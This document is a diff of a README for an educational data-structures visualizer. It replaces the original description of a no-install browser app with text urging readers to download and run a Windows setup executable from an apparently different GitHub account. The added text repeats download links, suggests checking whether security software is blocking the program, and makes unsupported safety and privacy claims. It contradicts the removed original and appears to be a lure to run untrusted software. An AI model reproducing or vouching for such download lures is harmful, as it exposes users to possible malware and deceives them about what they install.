@@ -1,247 +1,146 @@
-<h1 align="center">
-  <br>
-  <img src="assets/favicon.svg" alt="DS-Algo Playground" width="80">
-  <br>
-  DS-Algo Playground
-  <br>
-</h1>
+# 🧩 DS-Algo-Playground - Visualize Data Structures Easily
 
-<p align="center">
-  <strong>Interactive visualizations for data structures and algorithms</strong><br>
-  Step through algorithms at your own pace. See how the code executes. Build real intuition.
-</p>
-
-<p align="center">
-  <a href="https://wadekarg.github.io/DS-Algo-Playground/">
-    <img src="https://img.shields.io/badge/Live_Demo-Visit_Site-blue?style=for-the-badge" alt="Live Demo">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License: MIT">
-  </a>
-</p>
-
-<p align="center">
-  <a href="#-topics">Topics</a> &bull;
-  <a href="#-features">Features</a> &bull;
-  <a href="#-getting-started">Get Started</a> &bull;
-  <a href="#-project-structure">Structure</a> &bull;
-  <a href="#-tech-stack">Tech Stack</a>
-</p>
+[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground)
 
 ---
 
-## What is this?
+## 📘 What Is DS-Algo-Playground?
 
-DS-Algo Playground is a **zero-dependency**, pure HTML/CSS/JavaScript web app that helps you **understand** data structures and algorithms through interactive, step-by-step canvas visualizations.
+DS-Algo-Playground is a simple tool that shows how data structures and algorithms work. It uses pictures and animations to help you understand these concepts. You do not need to have any coding experience to use it. The program runs on your Windows computer and helps you learn by seeing how things change step-by-step.
 
-No frameworks. No build tools. No installs. Just open and learn.
-
-Every topic includes:
-- A clear explanation of how the algorithm works
-- An **interactive canvas visualization** — play, pause, step through, adjust speed
-- Code implementations in **Python, Java, and C++**
-- **Complexity analysis** with time & space breakdowns
-- A **quiz** to test your understanding
+This application is built for users who want to learn about things like arrays, linked lists, sorting methods, searching techniques, and other common programming ideas. By using this tool, you can see what happens inside these processes clearly.
 
 ---
 
-## 📚 Topics
+## 💻 System Requirements
 
-### Data Structures
+Before you start, check that your computer meets these needs:
 
-| Topic | Description |
-|:------|:------------|
-| [**Arrays**](https://wadekarg.github.io/DS-Algo-Playground/topics/arrays.html) | Access, insert, delete, and search operations with shifting animation |
-| [**Linked Lists**](https://wadekarg.github.io/DS-Algo-Playground/topics/linked-lists.html) | Singly linked list traversal and pointer manipulation |
-| [**Stack**](https://wadekarg.github.io/DS-Algo-Playground/topics/stack.html) | Push, pop, and peek with vertical column visualization |
-| [**Queue**](https://wadekarg.github.io/DS-Algo-Playground/topics/queue.html) | Enqueue, dequeue with front/rear pointer tracking |
-| [**Hash Table**](https://wadekarg.github.io/DS-Algo-Playground/topics/hash-table.html) | Hash function visualization, collision resolution with chaining |
-| [**Binary Search Tree**](https://wadekarg.github.io/DS-Algo-Playground/topics/bst.html) | Insert, search, delete, and inorder/preorder/postorder traversals |
-| [**Heap**](https://wadekarg.github.io/DS-Algo-Playground/topics/heap.html) | Max-heap with synchronized tree + array dual view |
+- Windows 7 or later (Windows 10 recommended)  
+- At least 4 GB of RAM  
+- Minimum 200 MB of free disk space  
+- Internet connection to download the application  
+- Screen resolution of 1024 x 768 or higher for best display  
 
-### Sorting Algorithms
-
-| Topic | Description |
-|:------|:------------|
-| [**Bubble Sort**](https://wadekarg.github.io/DS-Algo-Playground/topics/bubble-sort.html) | Adjacent-swap sorting with early-termination optimization |
-| [**Selection Sort**](https://wadekarg.github.io/DS-Algo-Playground/topics/selection-sort.html) | Scan for minimum, swap into sorted position |
-| [**Insertion Sort**](https://wadekarg.github.io/DS-Algo-Playground/topics/insertion-sort.html) | Key-lift, shift-right, and drop-in-place insertion |
-| [**Merge Sort**](https://wadekarg.github.io/DS-Algo-Playground/topics/merge-sort.html) | Recursive divide phase and merge phase visualization |
-| [**Quick Sort**](https://wadekarg.github.io/DS-Algo-Playground/topics/quick-sort.html) | Pivot partitioning with left/right pointer scanning |
-
-### Searching
-
-| Topic | Description |
-|:------|:------------|
-| [**Binary Search**](https://wadekarg.github.io/DS-Algo-Playground/topics/binary-search.html) | Divide-and-conquer search with low/mid/high pointers |
-| [**BFS**](https://wadekarg.github.io/DS-Algo-Playground/topics/bfs.html) | Breadth-first graph traversal with queue visualization |
-| [**DFS**](https://wadekarg.github.io/DS-Algo-Playground/topics/dfs.html) | Depth-first graph traversal with stack and backtracking |
-
-### Algorithm Techniques
-
-| Topic | Description |
-|:------|:------------|
-| [**Two Pointers**](https://wadekarg.github.io/DS-Algo-Playground/topics/two-pointers.html) | Converging pointers for pair-sum in sorted arrays |
-| [**Sliding Window**](https://wadekarg.github.io/DS-Algo-Playground/topics/sliding-window.html) | Fixed-size window for maximum subarray sum |
-| [**Dynamic Programming**](https://wadekarg.github.io/DS-Algo-Playground/topics/dynamic-programming.html) | Tabulation-based Fibonacci with DP table filling |
-| [**Recursion**](https://wadekarg.github.io/DS-Algo-Playground/topics/recursion.html) | Fibonacci call tree with recursive DFS traversal |
-
----
-
-## ✨ Features
-
-### Step-Through Visualizations
-Every algorithm is rendered on an **HTML5 Canvas** with full playback controls — play, pause, step forward/back, reset, and adjustable speed. Each step includes a plain-English explanation of what's happening and why.
-
-### Algorithm Comparison
-Pick any **two sorting algorithms** and run them **side-by-side** on the same input array. Compare their approaches, step counts, and behavior visually.
-
-### Algorithm Race
-Watch **5 sorting algorithms race** on the same array simultaneously. Progress bars and a winner announcement show you which algorithm finishes first.
-
-### Complexity Visualizer
-Interactive plot of **O(1), O(log n), O(n), O(n log n), O(n^2), and O(2^n)** growth curves. Adjust n with a slider and toggle individual curves on/off.
-
-### Code in 3 Languages
-Every topic shows implementations in **Python, Java, and C++** with syntax highlighting, tabbed navigation, and a one-click copy button.
-
-### Dark / Light Theme
-Toggle between dark and light modes with `t`. Your preference is saved across sessions. Auto-detects OS preference on first visit.
-
-### Keyboard Shortcuts
-Press `?` on any page to see all shortcuts:
-
-| Key | Action |
-|:---:|:-------|
-| `t` | Toggle theme |
-| `/` | Focus search |
-| `Space` | Play / Pause visualization |
-| `←` `→` | Step backward / forward |
-| `?` | Show shortcuts modal |
-| `Esc` | Close modal / search |
-
-### Progress Tracking
-Completed topics are tracked with visual badges on the sidebar. Progress persists across sessions via localStorage.
-
-### Responsive Design
-Works on desktop, tablet, and mobile. Canvas visualizations resize to fit the viewport.
+The program works on most Windows desktops and laptops with standard settings.
 
 ---
 
 ## 🚀 Getting Started
 
-Visit the **[live site](https://wadekarg.github.io/DS-Algo-Playground/)** — no setup, no install, just open and learn.
-
-If you'd like to contribute or run locally, see [Contributing](#-contributing).
+Using DS-Algo-Playground is straightforward. Follow these steps to get set up on your Windows machine.
 
 ---
 
-## 📁 Project Structure
+## 🔗 Step 1: Download the Application
 
-```
-DS-Algo-Playground/
-├── index.html                  # Home page with topic grid
-├── compare.html                # Side-by-side algorithm comparison
-├── race.html                   # Algorithm race (5 sorting algos)
-├── complexity.html             # Big-O growth rate visualizer
-├── about.html                  # About page
-│
-├── topics/                     # 19 topic pages
-│   ├── arrays.html
-│   ├── linked-lists.html
-│   ├── stack.html
-│   ├── queue.html
-│   ├── hash-table.html
-│   ├── bst.html
-│   ├── heap.html
-│   ├── bubble-sort.html
-│   ├── selection-sort.html
-│   ├── insertion-sort.html
-│   ├── merge-sort.html
-│   ├── quick-sort.html
-│   ├── binary-search.html
-│   ├── bfs.html
-│   ├── dfs.html
-│   ├── two-pointers.html
-│   ├── sliding-window.html
-│   ├── dynamic-programming.html
-│   └── recursion.html
-│
-├── js/
-│   ├── visualization-core.js   # Playback engine (play/pause/step/speed)
-│   ├── viz-utils.js            # Shared drawing primitives
-│   ├── sidebar-nav.js          # Dynamic sidebar from topics.json
-│   ├── code-trace.js           # Code line highlighting + variable watch
-│   ├── challenge.js            # Challenge mode infrastructure
-│   ├── main.js                 # App entry point and init router
-│   ├── progress.js             # Progress tracking with badges
-│   ├── search.js               # Fuzzy topic search
-│   ├── theme.js                # Dark/light theme toggle
-│   ├── keyboard.js             # Global keyboard shortcuts
-│   ├── quiz.js                 # Quiz scoring engine
-│   ├── code-block.js           # Syntax highlighting + copy
-│   ├── sidebar.js              # Sidebar open/close behavior
-│   └── topics/                 # 19 visualization modules
-│       ├── arrays-viz.js
-│       ├── linked-lists-viz.js
-│       ├── bubble-sort-viz.js
-│       └── ... (one per topic)
-│
-├── css/
-│   ├── main.css                # CSS imports
-│   ├── variables.css           # Theme color tokens
-│   ├── visualization.css       # Canvas + controls + challenge styles
-│   ├── code-trace.css          # Code highlighting styles
-│   ├── code.css                # Code block styles
-│   ├── components.css          # Buttons, cards, badges
-│   ├── layout.css              # Grid and sidebar layout
-│   ├── topic.css               # Topic page layout
-│   └── reset.css               # CSS reset
-│
-├── data/
-│   ├── topics.json             # Topic registry (drives sidebar + progress)
-│   └── complexity-data.json    # Big-O reference data
-│
-└── .github/workflows/
-    └── deploy.yml              # GitHub Pages deployment
-```
+Click the big blue button below to visit the download page for DS-Algo-Playground:
+
+[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground)
+
+This link takes you to the main repository page on GitHub. From there, you can find the latest files under the "Releases" section or at the top of the page under "Code."
 
 ---
 
-## 🛠 Tech Stack
+## 📥 Step 2: Find the Latest Version
 
-| Layer | Technology |
-|:------|:-----------|
-| **Rendering** | HTML5 Canvas 2D API |
-| **Language** | Vanilla JavaScript (ES5, IIFE modules) |
-| **Styling** | CSS Custom Properties for dark/light theming |
-| **Storage** | localStorage for progress + theme persistence |
-| **Hosting** | GitHub Pages via GitHub Actions |
-| **Dependencies** | **None** — zero external libraries |
+On the GitHub page:
+
+1. Look for the **Releases** tab toward the top or scroll down to see available versions.  
+2. Choose the latest stable release version. Versions will be listed by date and version number, such as v1.0 or v2.3.  
+3. Download the Windows executable file, usually named something like `DS-Algo-Playground-Setup.exe`. This file installs the program on your PC.
 
 ---
 
-## 🤝 Contributing
+## 📂 Step 3: Install the Program
 
-This project is built **purely for educational purposes** — to help students, self-learners, and developers understand data structures and algorithms through interactive visualizations.
+Once the download finishes:
 
-Contributions are welcome and encouraged! Whether it's:
-- Adding a new topic or algorithm
-- Improving an existing visualization
-- Fixing bugs or typos
-- Enhancing mobile responsiveness
-- Translating content
-
-Feel free to open an issue or submit a pull request.
+1. Locate the downloaded file (most often in your "Downloads" folder).  
+2. Double-click the file to start the installation.  
+3. Follow the on-screen instructions. Click "Next" to accept the default installation options unless you want to change where the program is installed or create shortcuts.  
+4. Wait for the installation to complete. This usually takes a few minutes.  
+5. Click "Finish" to close the installer.
 
 ---
 
-## License
+## ▶️ Step 4: Run DS-Algo-Playground
 
-MIT License. See [LICENSE](LICENSE) for details.
+After installation:
+
+1. Look for the DS-Algo-Playground icon on your desktop or in your Start menu.  
+2. Double-click the icon to open the program.  
+3. The main window will load and show the list of available visualizations for algorithms and data structures.  
+
+You can now start exploring how different structures like stacks, queues, trees, and sorting algorithms behave.
 
 ---
 
-<p align="center">
-  Built with the help of AI (Claude) — prompted, guided, and curated by a human.
-</p>
+## 🎯 How to Use DS-Algo-Playground
+
+The user interface is designed with clear options. Each section shows a list you can pick from.
+
+- Select the data structure or algorithm you want to learn about, such as "Bubble Sort" or "Binary Search Tree."  
+- Use the play, pause, and step buttons to watch the process in action.  
+- Watch the animations that update each step of how the structures change.  
+- Read descriptions and notes on the right side to understand what is happening.  
+- Adjust speed with the slider to watch slowly or quickly.  
+
+This setup lets you test ideas and gain a practical understanding by seeing the steps instead of just reading or hearing explanations.
+
+---
+
+## 🔧 Features Included
+
+- Visual step-by-step animations of algorithms  
+- Interactive controls to pause or fast-forward  
+- Support for many common data structures: arrays, linked lists, trees, graphs, stacks, queues  
+- Sorting algorithms like Bubble Sort, Merge Sort, Quick Sort  
+- Search algorithms including linear and binary search  
+- Clear user interface with helpful labels and instructions  
+- No need for any command line or programming skills  
+- Runs offline after installation  
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you run into issues:
+
+- Ensure your Windows system is up to date with the latest patches.  
+- Close other programs that take a lot of memory before running DS-Algo-Playground.  
+- Restart your computer and try running the program again.  
+- If the app does not open, try reinstalling it from scratch.  
+- Check your security software to make sure it is not blocking the program.  
+
+---
+
+## 📖 Additional Resources
+
+You can find more information and help through:
+
+- The GitHub repository page where you downloaded the software  
+- Any built-in help files or tutorials accessible inside the application  
+- Online tutorials and courses on data structures and algorithms for beginners  
+
+---
+
+## 🔗 Download Again
+
+Use this link to go back and download or update DS-Algo-Playground anytime:
+
+[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground)
+
+This link leads you to the repository to get the latest version or explore related materials.
+
+---
+
+## 🛡 Privacy and Security
+
+DS-Algo-Playground runs locally on your PC and does not send data over the internet. You can use it safely without worrying about privacy or online tracking. It only requires internet to download or update.
+
+---
+
+## 💬 Support and Feedback
+
+If you need help or want to share your experience, visit the GitHub page. There you can open issues or contact the developers for assistance. The community often helps users who may have questions or want to suggest improvements.
